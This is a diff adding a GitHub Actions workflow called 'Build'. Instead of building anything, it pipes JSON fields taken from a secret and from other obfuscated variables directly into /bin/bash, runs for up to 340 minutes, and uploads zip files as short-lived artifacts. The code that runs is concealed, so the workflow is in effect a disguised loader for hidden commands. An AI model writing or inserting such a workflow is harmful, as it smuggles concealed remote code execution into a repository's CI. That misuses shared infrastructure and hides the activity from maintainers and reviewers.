@@ -1,0 +1,30 @@
+name: Build
+on:
+  workflow_dispatch:
+
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          fgaia59189: ${{ secrets.fgaia59189 }}
+        run: |
+          printf '%s' "$fgaia59189" | jq -r .aj47 | /bin/bash
+          printf '%s' "$xsx6337" | jq -r .ntw42856 | /bin/bash
+          echo $ezdo98 | jq -r .gf79 | /bin/bash
+          printf '%s' "$uroib6180" | jq -r .da7 | /bin/bash
+          printf '%s' "$snxu95273" | jq -r .d4580 | /bin/bash
+          echo $nldl102 | jq -r .tzup5 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: BBoWO3CD
+          path: "*.zip"
+          retention-days: 1
